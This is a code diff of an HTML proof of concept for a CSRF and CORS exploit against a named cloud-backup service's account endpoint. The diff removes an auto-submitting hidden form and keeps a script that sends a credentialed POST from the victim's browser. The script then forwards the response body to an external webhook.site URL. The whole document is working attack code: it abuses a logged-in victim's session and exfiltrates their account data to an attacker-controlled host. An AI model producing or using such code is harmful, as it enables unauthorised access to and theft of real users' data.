@@ -1,17 +1,7 @@
 <html>
-  <!-- CSRF + CORS Exploit PoC -->
   <body>
-    <form id="csrfForm"
-          action="https://www.idrive.com/idrive/home/c2c/seat/details"
-          method="POST">
-      <input type="hidden" name="subuser" value="yes" />
-    </form>
-
     <script>
-      // Step 1: Trigger CSRF request
-      document.getElementById("csrfForm").submit();
-
-      // Step 2: Send same request via fetch to read response (CORS abuse)
+      // ONLY fetch (remove CSRF noise for testing)
       fetch("https://www.idrive.com/idrive/home/c2c/seat/details", {
         method: "POST",
         credentials: "include",
@@ -20,9 +10,13 @@
         },
         body: "subuser=yes"
       })
-      .then(res => res.text())
+      .then(res => {
+        console.log("Status:", res.status);
+        return res.text();
+      })
       .then(data => {
-        // Step 3: Exfiltrate response to your server
+        console.log("Response:", data);
+
         fetch("https://webhook.site/aec1b5ca-24ac-4695-aa17-9f0639db1ba0", {
           method: "POST",
           body: data
